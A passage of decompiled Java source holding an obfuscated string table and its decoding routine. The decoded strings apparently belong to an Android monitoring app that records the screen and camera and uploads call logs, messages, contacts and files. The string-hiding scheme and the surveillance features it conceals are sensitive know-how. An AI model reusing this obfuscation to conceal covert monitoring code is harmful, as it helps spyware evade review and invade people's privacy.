ﾚﾍ￱ﾲￅ￟ᯨﾚﾜﾚﾖﾉﾚﾛ￟ￅ￟ￛﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞ￪ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾚﾉﾚﾍﾆﾋﾗﾖﾑﾘ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞ￣ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾬﾚﾍﾉﾖﾜﾚ￼ﾒﾖﾜ￹ﾜﾞﾒᯟﾍﾞ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞￏ￣ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾬﾚﾍﾉﾖﾜﾚ￼ﾒﾖﾜ￹ﾜﾞﾒᯟﾍﾞ￸ﾌﾎﾊᯟﾞﾔﾆ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞￎ￫ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￣ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾬﾚﾍﾉﾖﾜﾚ￼ﾒﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞￍ￫ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￣ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾬﾚﾍﾉﾖﾜﾚ￹ﾜﾞﾒᯟﾍﾞ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾝ￣ﾲￅ￟ᯩﾋﾐﾏﾏﾚﾛ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾬﾚﾍﾉﾖﾜﾚ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾜ￫ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾊﾏﾓﾐﾞﾛﾖﾑﾘ￫ﾾﾊﾛᯓﾐﾭﾚﾜﾐﾍﾛﾖﾑﾘﾪﾏﾓﾐﾞﾛ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾛ￤ﾲￅ￟ᯯﾏﾛﾞﾋﾖﾑﾘ￟ﾷﾊﾒﾺﾑﾛﾫﾖﾒﾚﾌﾋﾞﾒﾏ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞﾇ￥ﾲￅ￟᯹ﾓﾚﾞﾍﾖﾑﾘ￟ﾗﾊﾒ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾇ￩ﾲￅ￟ᯩﾋﾐﾏﾏﾚﾛ￟ﾞﾓﾓ￟ﾈﾐﾍﾔﾚﾍﾌ￭ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾯﾍﾚﾙﾌ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￎ￢ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾽﾞﾌﾖﾜ￟ﾶﾑﾙﾐ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￍ￠ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾐﾑﾋﾞﾜﾋ￟ﾶﾑﾙﾐ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￌ￞ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾏﾞﾋﾗ￟ﾶﾑﾙﾐ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￋ￣ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾬﾆﾑﾜ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠ￈￟ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾾﾏﾏﾶﾑﾙﾐﾭﾚﾏﾐﾍﾋ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￇￚﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋ￟ﾈﾐﾍﾔﾚﾍﾌ￙ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￙ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￆ￟ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋ￟ﾈﾐﾍﾔﾚﾍﾌ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￎﾅ￡ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾽﾞﾌﾖﾜ￟ﾶﾑﾙﾐ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￍﾅ￟ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾐﾑﾋﾞﾜﾋ￟ﾶﾑﾙﾐ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￌﾅ￝ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾏﾞﾋﾗ￟ﾶﾑﾙﾐ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￋﾅ￢ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾬﾆﾑﾜ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠ￈ﾅ￤ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾾﾏﾏﾶﾑﾙﾐ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￇﾅ￙ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￆﾅ￞ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋ￟ﾚﾇﾚﾜﾊﾋﾐﾍￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￇﾅﾍ￙ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋ￟ﾚﾇﾚﾜﾊﾋﾐﾍￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￆﾅﾍ￞ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋ￟ﾚﾇﾚﾜﾊﾋﾐﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￎﾓ￡ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾽﾞﾌﾖﾜ￟ﾶﾑﾙﾐ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￍﾓ￟ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾼﾐﾑﾋﾞﾜﾋ￟ﾶﾑﾙﾐ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￌﾓ￝ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾯﾞﾋﾗ￟ﾶﾑﾙﾐ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￋﾓ￢ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾹﾖﾓﾚ￟ﾬﾆﾑﾜ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠ￈ﾓ￞ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾾﾏﾏ￟ﾶﾑﾙﾐ￟ﾬﾆﾑﾜ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￇﾓￔﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋ￟ﾬﾆﾑﾜ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￙ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￆﾓￚﾲￅ￟ᯩﾋﾞﾍﾋ￟ﾼﾞﾓﾓﾳﾐﾘ￟ﾭﾚﾏﾐﾍﾋ￟ﾬﾆﾑﾜ￟ﾏﾚﾍﾖﾐﾛﾖﾜ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￋﾙￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠￋﾙﾝ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾌﾞ￭ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾈﾆﾑﾔﾖﾑﾘ￺ﾏﾐﾈᯟﾍ￷ﾔﾚﾆᯝﾊﾞﾍﾛ￟ﾲￅ￟ᯭﾆﾑﾔﾖﾑﾘ￟ﾮﾊﾚﾊﾚﾛ￟ﾬﾜﾍﾚﾚﾑﾬﾋﾞﾋﾊﾌￅ￟￴￟ﾴﾚᯃﾸﾊﾞﾍﾛￅ￟￬￑ﾜﾞᯔﾳﾞﾊﾑﾜﾗﾧﾾﾜﾋﾖﾉﾖﾋﾆ￶ﾌﾜﾍᯟﾚﾑﾼﾞﾏ￰ﾹﾼﾲᯩﾜﾍﾚﾚﾑﾭﾚﾜﾐﾍﾛ￰ﾹﾼﾲᯩﾜﾍﾚﾚﾑﾭﾚﾜﾐﾍﾛ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾌﾝ￭ﾲￅ￟ᯩﾋﾐﾏﾏﾚﾛ￟ﾈﾆﾑﾔﾖﾑﾘ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾌﾜ￩ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾨﾆﾑﾔ￟ﾪﾏﾓﾐﾞﾛ￯ﾨﾆﾑᯑﾪﾏﾓﾐﾞﾛﾨﾐﾍﾔﾚﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾌﾛ￣ﾲￅ￟ᯯﾏﾛﾞﾋﾖﾑﾘ￟ﾨﾖﾑﾔﾺﾑﾛﾫﾖﾒﾚﾌﾋﾞﾒﾏ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾌﾇ￤ﾲￅ￟᯹ﾓﾚﾞﾍﾖﾑﾘ￟ﾈﾆﾑﾔ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘﾌ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾍﾍￓﾲￅ￟ᯪﾚﾑﾛﾖﾑﾘ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ﾊﾏﾓﾐﾞﾛ￟ﾍﾚﾎﾊﾚﾌﾋ￟ﾍﾚﾜﾖﾚﾉﾚﾛ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾈﾔ￧ﾲￅ￟᯻ﾓﾍﾚﾞﾛﾆ￟ﾖﾑ￟ﾙﾐﾍﾚﾘﾍﾐﾊﾑﾛ￫ﾲￅ￟ᯭﾞﾔﾖﾑﾘ￟ﾊﾏ￟ﾋﾗﾚ￟ﾞﾏﾏ￬ﾾﾏﾏ᯸ﾊﾜﾔﾚﾋﾯﾍﾚﾉﾚﾑﾋﾖﾐﾑￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾒﾖￎ￟ﾲￅ￟᯼ﾐﾍﾜﾚ￟ﾒﾞﾍﾔﾖﾑﾘ￟ﾝﾞﾜﾔﾘﾍﾐﾊﾑﾛ￟ﾋﾍﾊﾚ￷ﾹﾼﾲ᯼ﾐﾍﾜﾚￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾒﾖￏ￞ﾲￅ￟᯼ﾐﾍﾜﾚ￟ﾒﾞﾍﾔﾖﾑﾘ￟ﾝﾞﾜﾔﾘﾍﾐﾊﾑﾛ￟ﾙﾞﾓﾌﾚ￷ﾹﾼﾲ᯼ﾐﾍﾜﾚￗﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾞﾜﾞ￣ﾭﾚﾌᯟﾋﾋﾖﾑﾘ￟ﾾﾜﾜﾚﾌﾌﾖﾝﾖﾓﾖﾋﾆ￟ﾛﾞﾋﾚ￭ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾯﾍﾚﾙﾌ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾋﾞ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾋﾝ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾋﾍￗﾲￅ￟ᯪﾚﾑﾛﾖﾑﾘ￟ﾋﾞﾌﾔﾌ￟ﾊﾏﾓﾐﾞﾛ￟ﾍﾚﾎﾊﾚﾌﾋ￟ﾍﾚﾜﾚﾖﾉﾚﾛ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾋﾜ￢ﾲￅ￟ᯩﾋﾞﾍﾋﾚﾛ￟ﾫﾞﾌﾔ￟ﾭﾚﾌﾊﾓﾋ￟ﾪﾏﾓﾐﾞﾛ￦ﾫﾞﾌᯑﾠﾭﾚﾌﾊﾓﾋﾠﾪﾏﾓﾐﾞﾛﾠﾨﾐﾍﾔﾚﾍ￘ﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞﾠﾑﾑ￬ﾲￅ￟ᯯﾏﾛﾞﾋﾖﾑﾘ￟ﾱﾚﾌﾋ￟ￅ￟ￛﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞ￫ﾲￅ￟᯴ﾚﾌﾋ￟ﾪﾏﾛﾞﾋﾚ￟ﾻﾐﾑﾚ￑￭ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾯﾍﾚﾙﾌ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￲ﾛﾚﾉᯓﾜﾚﾠﾏﾐﾓﾖﾜﾆ￸ﾘﾍﾞᯔﾋﾚﾛ￶ﾜﾗﾚᯙﾔﾚﾛﾰﾑ￯ﾜﾗﾚᯙﾔﾚﾛﾫﾖﾒﾚﾬﾋﾞﾒﾏ￲ﾊﾏﾛᯛﾋﾚﾼﾐﾑﾋﾚﾇﾋ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￭ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾯﾍﾚﾙﾌ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￪ﾖﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾫﾖﾒﾚﾬﾋﾞﾒﾏ￶ﾊﾌﾞᯝﾚﾶﾑﾙﾐￛﾙ￈ￍᯛﾝￊￋﾙￒￏￍﾙￌￒￋￋﾜￋￒￇﾝￆﾞￒￍﾞ￈￈ﾞￆￊ￉ￋ￈ﾜﾞ";
    }

    public static String getString(long j) {
        return getString2(j, chunks);
    }

    private static short rotl(short s, int i) {
        return (short) ((s >>> (32 - i)) | (s << i));
    }

    public static long seed(long j) {
        long j2 = (j ^ (j >>> 33)) * 7109453100751455733L;
        return ((j2 ^ (j2 >>> 28)) * -3808689974395783757L) >>> 32;
    }

    public static long next(long j) {
        short s = (short) ((int) (j & PAYLOAD_SHORT_MAX));
        short s2 = (short) ((int) ((j >>> 16) & PAYLOAD_SHORT_MAX));
        short s3 = (short) (s2 ^ s);
        return ((((long) rotl(s3, 10)) | (((long) ((short) (rotl((short) (s + s2), 9) + s))) << 16)) << 16) | ((long) ((short) (((short) (rotl(s, 13) ^ s3)) ^ (s3 << 5))));
    }


}
```
